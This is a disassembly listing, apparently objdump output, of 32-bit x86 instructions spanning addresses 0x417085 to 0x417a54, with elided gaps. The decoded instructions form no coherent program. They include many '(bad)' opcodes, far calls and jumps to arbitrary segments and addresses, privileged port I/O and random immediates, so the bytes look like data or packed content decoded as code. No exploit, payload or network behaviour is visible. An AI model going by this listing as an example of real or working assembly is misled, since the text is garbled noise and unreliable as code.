  417085:	repz add BYTE PTR [eax],al
  417088:	add    eax,0x1f000001
  41708d:	repnz xor eax,0xa90b837a
  417093:	fsub   st,st(7)
  417095:	mov    dl,BYTE PTR [eax]
  417097:	jo     0x417116
  417099:	push   cs
  41709a:	imul   ebp,DWORD PTR [eax+0x10],0xf9c622a9
  4170a1:	mov    ds:0x747c0ef5,eax
  4170a6:	loop   0x417109
  4170a8:	dec    ecx
  4170a9:	sub    eax,0x3dce0abf
  4170ae:	mov    cl,0xaa
  4170b0:	add    ebp,DWORD PTR [edi-0x52456359]
  4170b6:	xor    al,0x90
  4170b8:	arpl   cx,di
  4170ba:	aam    0x43
  4170bc:	ja     0x417115
  4170be:	inc    ecx
  4170bf:	fstp   TBYTE PTR [esi-0x5b]
  4170c2:	pop    edi
  4170c3:	loop   0x417051
  4170c5:	pop    ebp
  4170c6:	call   0x7b97:0x7abea69d
  4170cd:	jno    0x417088
  4170cf:	dec    ecx
  4170d0:	mov    ds:0xe8a20e44,eax
  4170d5:	jmp    0x486aa9bc
  4170da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170db:	inc    ebp
  4170dc:	cmp    DWORD PTR [edx],edi
  4170de:	inc    ecx
  4170df:	inc    ebx
  4170e0:	add    ebp,ebp
  4170e2:	xchg   ecx,eax
  4170e3:	xor    DWORD PTR [ecx-0x74c8da27],esi
  4170e9:	push   es
  4170ea:	dec    edi
  4170eb:	xchg   edi,eax
  4170ec:	imul   ecx,DWORD PTR [edx+0x1f],0x40
  4170f0:	push   cs
  4170f1:	inc    eax
  4170f2:	xchg   BYTE PTR [edx+0x355bede7],ah
  4170f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170f9:	mov    DWORD PTR [ebx+0x7dc406ee],ecx
  4170ff:	leave  
  417100:	test   BYTE PTR [ebp+esi*4-0x1d],dh
  417104:	lahf   
  417105:	out    dx,al
  417106:	sahf   
  417107:	imul   ebx,edi,0xa898cb36
  41710d:	stos   DWORD PTR es:[edi],eax
  41710e:	jmp    0xfceaf364
  417113:	repz call 0xc9d2:0x393f440a
  41711b:	pop    eax
  41711c:	inc    ebp
  41711d:	inc    ebx
  41711e:	sbb    al,0xe5
  417120:	ss push ecx
  417122:	arpl   WORD PTR [ebp+ebp*2-0x430a56af],cx
  417129:	fisttp QWORD PTR [ecx+0x3c9fd817]
  41712f:	and    ebp,DWORD PTR [edi]
  417131:	clc    
  417132:	or     dh,BYTE PTR [ebx+0x66]
  417135:	mov    eax,ds:0x4c281924
  41713a:	push   edi
  41713b:	inc    edx
  41713c:	mov    edi,0xaa1101c7
  417141:	jge    0x4170ff
  417143:	lods   eax,DWORD PTR ds:[esi]
  417144:	loopne 0x417136
  417146:	fdivr  QWORD PTR [ebx-0x2e]
  417149:	lods   al,BYTE PTR ds:[esi]
  41714a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41714b:	gs loope 0x41714b
  41714e:	mov    ah,0x94
  417150:	inc    ebp
  417151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417152:	mov    ds:0x548cfbde,eax
  417157:	fadd   DWORD PTR ds:0x7c9b8419
  41715d:	sbb    ah,dh
  41715f:	sbb    ch,cl
  417161:	jae    0x417179
  417163:	out    dx,al
  417164:	lock lahf 
  417166:	shr    BYTE PTR [edi-0x16479b0a],1
  41716c:	add    DWORD PTR [edx-0x5f],esi
  41716f:	fldl2e 
  417171:	daa    
  417172:	cs mov ss:0x1c761739,al
  417179:	adc    BYTE PTR [esi+0x61],bh
  41717c:	popf   
  41717d:	jb     0x41719e
  41717f:	or     BYTE PTR [edx+esi*8],0x80
  417183:	pop    es
  417184:	dec    edx
  417185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417186:	jae    0x41713f
  417188:	mul    DWORD PTR [esi+0x7637ea44]
  41718e:	xchg   dl,cl
  417190:	jge    0x417192
	...
  4171f2:	add    BYTE PTR [eax],al
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	shr    BYTE PTR [eax+ebp*4],0xbb
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x7f000001
  41720d:	in     al,dx
  41720e:	sbb    ch,BYTE PTR [edx+0x2d]
  417211:	inc    eax
  417212:	cli    
  417213:	lods   eax,DWORD PTR ds:[esi]
  417214:	test   BYTE PTR [ebp+0xa9cef5a],ch
  41721a:	(bad)  
  41721b:	outs   dx,BYTE PTR ds:[esi]
  41721c:	lods   al,BYTE PTR ds:[esi]
  41721d:	aas    
  41721e:	jnp    0x417275
  417220:	nop
  417221:	aaa    
  417222:	aad    0x60
  417224:	inc    BYTE PTR [ecx+0x16]
  417227:	dec    esp
  417228:	adc    al,0x6e
  41722a:	mov    edx,0xa1341f90
  41722f:	push   0x3f7ddbd6
  417234:	adc    eax,0x51d98840
  417239:	xchg   edi,eax
  41723a:	xor    bh,BYTE PTR [edx]
  41723c:	pop    es
  41723d:	jecxz  0x417240
  41723f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417241:	push   esi
  417242:	push   ebx
  417243:	mov    ch,0x4e
  417245:	fcom   QWORD PTR [edi+0x248ae389]
  41724b:	lods   al,BYTE PTR ds:[esi]
  41724c:	ins    BYTE PTR es:[edi],dx
  41724d:	retf   0xaef3
  417250:	or     eax,0xe1c699ad
  417255:	fnstcw WORD PTR ss:[esi+eax*1+0x5293b594]
  41725d:	inc    esp
  41725e:	in     eax,0x42
  417260:	mov    bh,0x6b
  417262:	cs xor dh,ah
  417265:	mov    bl,0xba
  417267:	push   0xffffffe6
  417269:	pop    esi
  41726a:	inc    ecx
  41726b:	enter  0x98e0,0x1
  41726f:	shr    BYTE PTR [edx],cl
  417271:	sub    ah,bl
  417273:	iret   
  417274:	jecxz  0x417266
  417276:	js     0x41720c
  417278:	mov    eax,ds:0x609e3d4c
  41727d:	cmp    ebp,esi
  41727f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417280:	inc    ebx
  417281:	das    
  417282:	inc    eax
  417283:	add    al,0x27
  417285:	inc    edi
  417286:	add    esi,0xffffff8e
  417289:	lds    ebp,FWORD PTR [eax]
  41728b:	nop
  41728c:	pop    ds
  41728d:	mov    eax,ds:0xe5ef13d9
  417292:	sub    al,0xb7
  417294:	xchg   edi,eax
  417295:	out    dx,al
  417296:	nop
  417297:	push   eax
  417298:	cmp    al,0x31
  41729a:	jl     0x417280
  41729c:	xchg   ah,dl
  41729e:	mul    ecx
  4172a0:	adc    eax,0x28fdafa6
  4172a5:	hlt    
  4172a6:	fdiv   DWORD PTR [edx+ebp*8-0x39]
  4172aa:	inc    ecx
  4172ab:	or     bh,BYTE PTR [esi-0x32]
  4172ae:	xchg   esp,eax
  4172af:	out    0x20,eax
  4172b1:	nop
  4172b2:	push   DWORD PTR [edx-0x1c]
  4172b5:	lds    eax,FWORD PTR [esi-0x6f63ff59]
  4172bb:	sbb    DWORD PTR [edi-0x2639afa2],esp
  4172c1:	adc    DWORD PTR [ecx+edi*2-0x77],esp
  4172c5:	out    0x5f,al
  4172c7:	test   al,0xca
  4172c9:	inc    eax
  4172ca:	mov    bh,0x6
  4172cc:	test   al,0xbb
  4172ce:	adc    edi,esi
  4172d0:	sbb    DWORD PTR [ecx-0x6974e3c6],0xffffff86
  4172d7:	mov    cl,0x4f
  4172d9:	push   ss
  4172da:	in     eax,dx
  4172db:	cmp    DWORD PTR [edi-0x5cca4bf0],edx
  4172e1:	mov    ds,ebp
  4172e3:	pop    esp
  4172e4:	outs   dx,BYTE PTR ds:[esi]
  4172e5:	ds je  0x41730a
  4172e8:	not    DWORD PTR [ecx+0x2a]
  4172eb:	inc    edi
  4172ec:	dec    edx
  4172ed:	(bad)  
  4172ee:	(bad)  
  4172ef:	fisubr DWORD PTR [ebx]
  4172f1:	mov    ecx,0x8b38e94f
  4172f6:	add    al,0x9
  4172f8:	mov    edi,0x227eac0d
  4172fd:	sub    ecx,DWORD PTR [edi-0x2f]
  417300:	pushf  
  417301:	ds clc 
  417303:	aas    
  417304:	fild   DWORD PTR [edx-0x24]
  417307:	inc    esi
  417308:	xor    ebp,DWORD PTR [eax]
  41730a:	fcomip st,st(4)
  41730c:	adc    BYTE PTR [eax+0x2096a8],al
	...
  417372:	add    BYTE PTR [eax],al
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs ins BYTE PTR es:[edi],dx
  417381:	lock lahf 
  417383:	loop   0x417310
  417385:	cmc    
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x88000001
  41738d:	loope  0x4173fd
  41738f:	inc    ebp
  417390:	adc    BYTE PTR [ecx-0x4d],0x38
  417394:	dec    ecx
  417395:	(bad)  
  417396:	fiadd  WORD PTR [esi-0x35]
  417399:	cmp    DWORD PTR [eax],ecx
  41739b:	mov    ah,BYTE PTR ds:0x124d5c51
  4173a1:	adc    al,0xac
  4173a3:	mov    edi,0x74348b6c
  4173a8:	jecxz  0x417393
  4173aa:	push   0x52
  4173ac:	inc    esi
  4173ad:	into   
  4173ae:	mov    dh,al
  4173b0:	jo     0x417427
  4173b2:	jmp    0x9980:0x51d7cf8e
  4173b9:	fdivr  QWORD PTR [edx]
  4173bb:	push   esi
  4173bc:	push   ss
  4173bd:	mov    al,ds:0x587abe2b
  4173c2:	aas    
  4173c3:	hlt    
  4173c4:	leave  
  4173c5:	in     eax,dx
  4173c6:	inc    ebp
  4173c7:	loopne 0x41735c
  4173c9:	dec    ecx
  4173ca:	push   esi
  4173cb:	call   DWORD PTR [eax-0x69ff6914]
  4173d1:	adc    al,0x8c
  4173d3:	xchg   ecx,eax
  4173d4:	cmp    ch,dh
  4173d6:	loopne 0x4173cf
  4173d8:	outs   dx,DWORD PTR ds:[esi]
  4173d9:	sub    eax,0x214c6ec6
  4173de:	dec    ecx
  4173df:	pop    es
  4173e0:	push   edx
  4173e1:	sub    BYTE PTR [bp-0x23],dh
  4173e5:	jp     0x41741d
  4173e7:	retf   0x4302
  4173ea:	xchg   esp,eax
  4173eb:	gs inc edx
  4173ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ee:	pop    ds
  4173ef:	jb     0x41746b
  4173f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f2:	jne    0x41741a
  4173f4:	aas    
  4173f5:	clc    
  4173f6:	sub    DWORD PTR [esi-0x5f5d7675],edi
  4173fc:	dec    esp
  4173fd:	sti    
  4173fe:	jb     0x41739f
  417400:	jbe    0x4173a0
  417402:	shl    BYTE PTR [eax+ebp*2-0x29],cl
  417406:	add    BYTE PTR [eax],0x5
  417409:	mov    WORD PTR [ebx+0x5f],?
  41740c:	mov    ds:0xd2653f8e,eax
  417411:	std    
  417412:	in     eax,0x89
  417414:	lods   al,BYTE PTR ds:[esi]
  417415:	fwait
  417416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417417:	and    eax,0x76221435
  41741c:	jnp    0x417473
  41741e:	xchg   BYTE PTR [ebx-0x69722069],bl
  417424:	cli    
  417425:	jmp    0x41742c
  417427:	push   es
  417428:	add    eax,0xe526ba0a
  41742d:	inc    esp
  41742e:	(bad)  
  41742f:	ficomp WORD PTR [edi+eiz*1]
  417432:	test   al,0x66
  417434:	jo     0x417452
  417436:	sub    eax,DWORD PTR [ebx]
  417438:	xchg   esp,eax
  417439:	retf   
  41743a:	sub    eax,DWORD PTR [ebx]
  41743c:	add    DWORD PTR [ebp+0x4f782eeb],ebp
  417442:	xchg   ebp,eax
  417443:	stos   BYTE PTR es:[edi],al
  417444:	call   0xff38:0x3bb9e87
  41744b:	mov    ds:0xbce17707,eax
  417450:	xchg   BYTE PTR [eax-0x5d33b75b],cl
  417456:	loopne 0x41745a
  417458:	sbb    al,0x42
  41745a:	clc    
  41745b:	push   eax
  41745c:	mov    bh,0xcb
  41745e:	mov    cl,0x52
  417460:	xchg   ebp,eax
  417461:	mov    bl,0xbf
  417463:	mov    ecx,DWORD PTR [eax-0x3c]
  417466:	rcl    DWORD PTR [ebx+0x4c],1
  417469:	into   
  41746a:	arpl   bp,bx
  41746c:	sbb    DWORD PTR [ebp+0x526c7960],0xffffffde
  417473:	cmp    BYTE PTR [edx-0x6a386e49],dh
  417479:	cld    
  41747a:	pop    ecx
  41747b:	xor    ah,BYTE PTR [edx]
  41747d:	mov    ecx,0x7d3a912d
  417482:	mov    eax,0x8d51fb93
  417487:	dec    ebx
  417488:	inc    ecx
  417489:	bound  edx,QWORD PTR [esi]
  41748b:	cli    
  41748c:	hlt    
  41748d:	scas   al,BYTE PTR es:[edi]
  41748e:	pop    ss
  41748f:	lods   eax,DWORD PTR ds:[esi]
  417490:	stc    
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	popf   
  417501:	pusha  
  417502:	int3   
  417503:	and    dl,BYTE PTR [eax+0x50000f6]
  417509:	add    DWORD PTR [eax],eax
  41750b:	add    al,dl
  41750d:	ret    0xd53f
  417510:	mov    edi,0x7c64feb1
  417515:	out    0x3c,al
  417517:	(bad)  
  417518:	stos   DWORD PTR es:[edi],eax
  417519:	mov    dl,0x35
  41751b:	in     eax,0x9f
  41751d:	out    dx,eax
  41751e:	(bad)  
  41751f:	fcmove st,st(6)
  417521:	and    eax,ecx
  417523:	cmp    al,0xf4
  417525:	fnstsw WORD PTR [edx]
  417527:	push   ss
  417528:	sub    eax,0x97cc3d4d
  41752d:	cli    
  41752e:	adc    ebp,esp
  417530:	push   ebx
  417531:	gs adc ch,al
  417534:	outs   dx,BYTE PTR ds:[esi]
  417535:	lods   al,BYTE PTR ds:[esi]
  417536:	test   BYTE PTR [eax],0x1a
  417539:	dec    ebp
  41753a:	(bad)  
  41753b:	xchg   edx,eax
  41753c:	sbb    eax,DWORD PTR [ebp-0x30]
  41753f:	aaa    
  417540:	sti    
  417541:	das    
  417542:	adc    DWORD PTR [edx+eax*1+0x2c],edi
  417546:	mov    al,ds:0x6fe54f74
  41754b:	popf   
  41754c:	ret    0x2158
  41754f:	xor    al,0x7c
  417551:	jae    0x4174f9
  417553:	jle    0x417506
  417555:	ins    BYTE PTR es:[edi],dx
  417556:	arpl   WORD PTR [edi-0x21],si
  417559:	xchg   esi,eax
  41755a:	lea    edi,[eax]
  41755c:	mov    WORD PTR [edi],fs
  41755e:	in     al,dx
  41755f:	aaa    
  417560:	cs mov dh,0x1a
  417563:	scas   eax,DWORD PTR es:[edi]
  417564:	dec    ebp
  417565:	inc    esi
  417566:	sbb    ebx,DWORD PTR [edx+0x19]
  417569:	in     al,0x45
  41756b:	int    0x60
  41756d:	dec    ecx
  41756e:	out    dx,al
  41756f:	push   esp
  417570:	jb     0x417547
  417572:	dec    esp
  417573:	test   eax,0xb5385c96
  417578:	shr    DWORD PTR [edx],1
  41757a:	or     al,0x57
  41757c:	adc    BYTE PTR [ebx],bh
  41757e:	mov    dh,0x81
  417580:	sub    esi,edi
  417582:	jo     0x41758b
  417584:	call   0x162ce34f
  417589:	daa    
  41758a:	jmp    0xff8ae3de
  41758f:	loopne 0x41753d
  417591:	jnp    0x41752e
  417593:	jle    0x4175e8
  417595:	mov    al,0xad
  417597:	jmp    0x417526
  417599:	ds (bad) 
  41759b:	sub    BYTE PTR [eax],ah
  41759d:	pop    edi
  41759e:	daa    
  41759f:	test   al,0x5b
  4175a1:	mov    eax,ds:0x2463b648
  4175a6:	mov    ecx,0xf2d56491
  4175ab:	cmc    
  4175ac:	xor    al,0xca
  4175ae:	fsubr  QWORD PTR [edx+0x5251aa11]
  4175b4:	or     ch,BYTE PTR [ebx]
  4175b6:	jb     0x4175de
  4175b8:	jl     0x4175c9
  4175ba:	std    
  4175bb:	mov    cl,0x73
  4175bd:	test   al,0xde
  4175bf:	push   edi
  4175c0:	cli    
  4175c1:	sub    ebx,edi
  4175c3:	dec    ebp
  4175c4:	div    BYTE PTR [edx-0x7e]
  4175c7:	jno    0x4175ae
  4175c9:	clc    
  4175ca:	pop    DWORD PTR [edi-0x3f]
  4175cd:	mov    ebp,DWORD PTR [ebx+eax*4]
  4175d0:	add    DWORD PTR [ebx],edi
  4175d2:	mov    BYTE PTR [edi+0x653656cb],0xe1
  4175d9:	push   esi
  4175da:	idiv   ch
  4175dc:	pop    es
  4175dd:	sub    BYTE PTR [edi+edx*2+0x530ed161],0x90
  4175e5:	pop    ebx
  4175e6:	adc    BYTE PTR [esp+eiz*2-0x54a05c91],cl
  4175ed:	jo     0x417579
  4175ef:	retf   0x5043
  4175f2:	mov    bh,0x1b
  4175f4:	adc    DWORD PTR [edx-0x59],ebp
  4175f7:	mov    esp,0x18f31b41
  4175fc:	ins    DWORD PTR es:[edi],dx
  4175fd:	pop    esi
  4175fe:	outs   dx,DWORD PTR ds:[esi]
  4175ff:	mov    ecx,0xe7211fab
  417604:	mov    esp,0xfd244bdf
  417609:	xor    al,0xcd
  41760b:	pop    esp
  41760c:	mov    esi,0xdfdc3cb0
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fiadd  DWORD PTR [ebx]
  417681:	arpl   bx,cx
  417683:	adc    edx,DWORD PTR [ebp+0x50000f7]
  417689:	add    DWORD PTR [eax],eax
  41768b:	add    BYTE PTR [ecx+0x2ac13187],ch
  417691:	xor    eax,esp
  417693:	mov    dl,0x97
  417695:	mov    ds:0x72dad221,al
  41769a:	push   ebp
  41769b:	mov    bl,0xe3
  41769d:	mov    esi,0x83859129
  4176a2:	es dec edi
  4176a4:	lahf   
  4176a5:	xchg   dl,ah
  4176a7:	cmp    al,0xdb
  4176a9:	xchg   DWORD PTR [ecx+0xa1c31aa],ecx
  4176af:	jg     0x4176c3
  4176b1:	jns    0x4176b6
  4176b3:	jo     0x417647
  4176b5:	btc    DWORD PTR [edx-0x15],ebx
  4176b9:	dec    ebp
  4176ba:	push   ebx
  4176bb:	dec    edx
  4176bc:	bound  esp,QWORD PTR [edi]
  4176be:	(bad)  
  4176c0:	retf   0xdf2f
  4176c3:	add    BYTE PTR [ecx-0x52dee113],bl
  4176c9:	iret   
  4176ca:	and    bh,BYTE PTR [esi-0x7c86a434]
  4176d0:	xchg   ebx,eax
  4176d1:	test   al,0x2d
  4176d3:	call   0x501c:0x69b7d595
  4176da:	aam    0x6d
  4176dc:	inc    ebp
  4176dd:	xchg   DWORD PTR [ecx-0x58],ebx
  4176e0:	sub    BYTE PTR [ebx],dl
  4176e2:	cli    
  4176e3:	sbb    BYTE PTR gs:[ebp+edx*4+0x2c],bl
  4176e8:	nop
  4176e9:	xlat   BYTE PTR ds:[ebx]
  4176ea:	aas    
  4176eb:	aam    0xd4
  4176ed:	inc    esp
  4176ee:	int3   
  4176ef:	sbb    ch,bh
  4176f1:	pusha  
  4176f2:	or     al,0x38
  4176f4:	jne    0x4176f9
  4176f6:	pop    ss
  4176f7:	dec    esp
  4176f8:	imul   ebx,DWORD PTR [eax-0x4c0440e],0xffffff8b
  4176ff:	fsubr  DWORD PTR [ebx+0x54]
  417702:	aas    
  417703:	xchg   edi,eax
  417704:	test   al,0x95
  417706:	cdq    
  417707:	or     BYTE PTR [eax+ebp*4+0x6a],dh
  41770b:	in     al,0x8
  41770d:	dec    ecx
  41770e:	xlat   BYTE PTR ds:[ebx]
  41770f:	leave  
  417710:	vunpcklps ymm5,ymm0,ymm1
  417714:	add    al,0x2
  417716:	push   es
  417717:	or     ebp,DWORD PTR [eax+0x5d]
  41771a:	adc    ebp,edi
  41771c:	pop    esi
  41771d:	mov    bl,0x51
  41771f:	mov    edx,0xa1e3e1ad
  417724:	xlat   BYTE PTR ds:[ebx]
  417725:	jb     0x417725
  417727:	imul   esi,edx,0xffffff8f
  41772a:	inc    DWORD PTR [eax-0x6131de50]
  417730:	imul   BYTE PTR [edx+0x4f]
  417733:	mov    bh,0x45
  417735:	sub    ebp,DWORD PTR [esi+ebx*8+0x3a]
  417739:	leave  
  41773a:	mov    dh,0x8c
  41773c:	arpl   WORD PTR [ecx-0x54c36876],bp
  417742:	pop    ebp
  417743:	ins    DWORD PTR es:[edi],dx
  417744:	call   0x77672e7a
  417749:	daa    
  41774a:	and    al,0x6e
  41774c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41774d:	out    dx,al
  41774e:	xchg   BYTE PTR [esi+0x5e],bl
  417751:	fistp  WORD PTR ds:0xd57f66e0
  417757:	jne    0x41775e
  417759:	loope  0x417712
  41775b:	mov    edi,edx
  41775d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775e:	loope  0x417708
  417760:	retf   
  417761:	inc    esi
  417762:	jle    0x4176f9
  417764:	pop    ss
  417765:	dec    eax
  417766:	sti    
  417767:	push   ds
  417768:	xor    cl,BYTE PTR [eax+esi*1-0x24870b81]
  41776f:	or     BYTE PTR ds:0x43a2a87a,0xe7
  417776:	xchg   edx,eax
  417777:	loop   0x417790
  417779:	(bad)  
  41777a:	xor    eax,0xe930fdea
  41777f:	xchg   edx,eax
  417780:	das    
  417781:	add    edx,ebx
  417783:	jg     0x41779a
  417785:	test   bh,0x65
  417788:	fiadd  DWORD PTR [ebx-0x2312ac80]
  41778e:	loopne 0x417722
  417790:	pop    eax
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	ror    BYTE PTR ds:0x9ac9c087,cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    eax,0x77000001
  41780d:	dec    edx
  41780e:	shr    ebp,1
  417810:	ins    DWORD PTR es:[edi],dx
  417811:	dec    ebx
  417812:	inc    edi
  417813:	xchg   BYTE PTR [eax+0x16a81b01],bh
  417819:	fnstenv [edi]
  41781b:	ret    0x41bd
  41781e:	daa    
  41781f:	mov    bh,BYTE PTR [edx+esi*1]
  417822:	sbb    DWORD PTR [esi-0x7602512d],0xffffffbf
  417829:	inc    ecx
  41782a:	fnstsw WORD PTR ds:0xb453556d
  417830:	mov    edx,0x3768d305
  417835:	jbe    0x41788f
  417837:	dec    eax
  417838:	add    ecx,DWORD PTR [edi+0x28]
  41783b:	mov    cl,0xbd
  41783d:	pop    edi
  41783e:	xor    al,0xd9
  417840:	mov    bl,0xcc
  417842:	popw   ss
  417844:	fwait
  417845:	add    DWORD PTR [eax+0xd],0x74
  417849:	nop
  41784a:	mov    ch,0xbd
  41784c:	or     ebp,esi
  41784e:	push   ds
  41784f:	mov    eax,0x3b052242
  417854:	jbe    0x417876
  417856:	scas   eax,DWORD PTR es:[edi]
  417857:	push   0x8d5da2e5
  41785c:	or     eax,0xd4f30964
  417861:	sub    al,0xab
  417863:	aaa    
  417864:	inc    ebx
  417865:	sub    BYTE PTR [esp+eax*4+0x77],bh
  417869:	fldcw  WORD PTR ds:0xaaba3da9
  41786f:	retf   
  417870:	xchg   ebx,eax
  417871:	xor    BYTE PTR [ebx],dh
  417873:	sub    ch,BYTE PTR [esi-0xd782a4f]
  417879:	addr16 xchg ebp,eax
  41787b:	jb     0x4178be
  41787d:	inc    edx
  41787e:	xchg   esi,eax
  41787f:	cmp    BYTE PTR [ecx-0x2ebfd664],ch
  417885:	sub    BYTE PTR [eax],0x9d
  417888:	rol    BYTE PTR [ebx],0xf1
  41788b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41788c:	jecxz  0x41783f
  41788e:	outs   dx,BYTE PTR ds:[esi]
  41788f:	aas    
  417890:	mov    al,ds:0xb22ba427
  417895:	out    dx,eax
  417896:	sub    al,0x80
  417898:	cld    
  417899:	ins    BYTE PTR es:[di],dx
  41789b:	or     bl,BYTE PTR [esi-0x7841bc89]
  4178a1:	(bad)  
  4178a2:	das    
  4178a3:	test   eax,0xfd5c47b8
  4178a8:	mov    dl,0xc7
  4178aa:	jb     0x41786b
  4178ac:	sbb    ebp,DWORD PTR [ecx]
  4178ae:	push   esp
  4178af:	fnstsw WORD PTR [ebx-0x4fb8f388]
  4178b5:	dec    eax
  4178b6:	imul   eax,DWORD PTR [ebp-0x75f0272c],0xfffffff0
  4178bd:	pop    esi
  4178be:	hlt    
  4178bf:	imul   esp,DWORD PTR [edx+0x46],0x8fe1da99
  4178c6:	and    eax,0x1c4478ac
  4178cb:	out    0x16,eax
  4178cd:	adc    al,0x7b
  4178cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178d0:	cld    
  4178d1:	repnz out dx,eax
  4178d3:	adc    al,0xd3
  4178d5:	fsub   QWORD PTR [ecx-0x3b]
  4178d8:	lahf   
  4178d9:	add    eax,0xa1aa5b16
  4178de:	(bad)  
  4178df:	gs stos DWORD PTR es:[edi],eax
  4178e1:	push   ds
  4178e2:	mov    al,0xfe
  4178e4:	jno    0x41788b
  4178e6:	leave  
  4178e7:	adc    ebx,DWORD PTR [edi+ebp*4-0x70d71119]
  4178ee:	sbb    eax,0x3447f6f0
  4178f3:	clc    
  4178f4:	pop    ss
  4178f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f6:	lods   eax,DWORD PTR ds:[esi]
  4178f7:	dec    esi
  4178f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178f9:	dec    esp
  4178fa:	push   ds
  4178fb:	mov    BYTE PTR [esi-0x28],cl
  4178fe:	xor    eax,0xbf7ce6d
  417903:	sub    eax,0x1ee79d81
  417908:	jns    0x4178cb
  41790a:	sbb    BYTE PTR [ebp-0x64fccb64],bl
  417910:	inc    DWORD PTR [eax]
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	pop    eax
  417981:	aam    0xee
  417983:	jne    0x417924
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0xdf000001
  41798d:	mov    eax,0x3ea7f20b
  417992:	sti    
  417993:	pop    ebx
  417994:	hlt    
  417995:	xor    bh,BYTE PTR [esi]
  417997:	mov    ah,0x89
  417999:	xchg   edx,eax
  41799a:	jmp    0x41799d
  41799c:	cmp    BYTE PTR [edi-0x6d99cfc7],dh
  4179a2:	loopne 0x41797e
  4179a4:	clc    
  4179a5:	les    esi,FWORD PTR [edx]
  4179a7:	push   ds
  4179a8:	imul   esp,DWORD PTR [edi-0x1b],0xffffffa9
  4179ac:	in     al,0x64
  4179ae:	jmp    0x4179f3
  4179b0:	cwde   
  4179b1:	xchg   ecx,eax
  4179b2:	and    DWORD PTR [ebp+eiz*2-0x727bb0b0],ebp
  4179b9:	mov    WORD PTR [esi],?
  4179bb:	push   esi
  4179bc:	or     al,0xa2
  4179be:	mov    al,ds:0x59b1b5f5
  4179c3:	cmp    edx,DWORD PTR [ecx]
  4179c5:	sbb    DWORD PTR es:[ecx],0xe1e22249
  4179cc:	repnz scas eax,DWORD PTR es:[edi]
  4179ce:	pop    eax
  4179cf:	sub    ah,BYTE PTR [ebx-0x171dff26]
  4179d5:	push   ecx
  4179d6:	sub    dh,BYTE PTR [edx+esi*8-0x4]
  4179da:	mov    bh,0x28
  4179dc:	cmp    edx,edi
  4179de:	cld    
  4179df:	jns    0x4179bf
  4179e1:	out    dx,al
  4179e2:	push   edx
  4179e3:	mov    ds:0x5b4a6446,al
  4179e8:	push   0xfffffffa
  4179ea:	sbb    al,0x72
  4179ec:	pop    es
  4179ed:	test   al,0xc7
  4179ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179f0:	add    DWORD PTR [ecx],edi
  4179f2:	imul   ebx
  4179f4:	int3   
  4179f5:	sub    DWORD PTR [ecx],0xe1385a19
  4179fb:	(bad)  
  4179fc:	shl    esp,1
  4179fe:	pop    ss
  4179ff:	(bad)
  417a03:	jnp    0x417a26
  417a05:	into   
  417a06:	add    BYTE PTR [edi+0x7d2f604a],ah
  417a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a0d:	and    ebx,ebx
  417a0f:	xchg   edx,eax
  417a10:	mov    ah,0x8d
  417a12:	sub    al,0x78
  417a14:	int3   
  417a15:	sub    bh,al
  417a17:	(bad)  
  417a18:	cdq    
  417a19:	sbb    al,0x4b
  417a1b:	add    DWORD PTR [esi*1+0xbf5b0ce],ecx
  417a22:	mov    bh,0xa0
  417a24:	mov    dl,BYTE PTR [esi+0x1]
  417a27:	outs   dx,DWORD PTR ds:[esi]
  417a28:	test   BYTE PTR [edx-0x49dab13f],bh
  417a2e:	inc    esi
  417a2f:	or     al,0x13
  417a31:	or     edi,edi
  417a33:	cmc    
  417a34:	mov    fs,ebp
  417a36:	ret    
  417a37:	sbb    ebp,ecx
  417a39:	mov    edi,0xbf0d8985
  417a3e:	in     al,dx
  417a3f:	mov    esp,0x61dfa4f9
  417a44:	xor    edi,DWORD PTR [ebx+0x4def568f]
  417a4a:	xchg   ebx,eax
  417a4b:	loopne 0x417a31
  417a4d:	mov    bh,0xa
  417a4f:	mov    ebp,0xbc52a229
  417a54:	xchg   BYTE PTR [ecx],al
